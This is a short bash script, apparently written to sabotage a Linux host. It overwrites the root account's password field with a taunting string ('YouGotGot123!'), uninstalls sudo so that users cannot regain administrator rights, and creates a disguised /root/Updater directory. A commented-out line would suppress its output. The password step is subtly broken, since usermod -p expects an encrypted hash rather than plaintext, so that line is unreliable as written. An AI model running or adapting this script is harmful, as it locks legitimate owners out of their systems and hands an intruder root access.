#!/bin/bash

#Redirects output
#command > /dev/null 2>&1

#Makes root password custom pass
usermod -p 'YouGotGot123!' root

#Deletes sudo , which should prevent users from gaining sudo access
apt remove sudo

#Makes Directory for copy.txt
mkdir /root/Updater
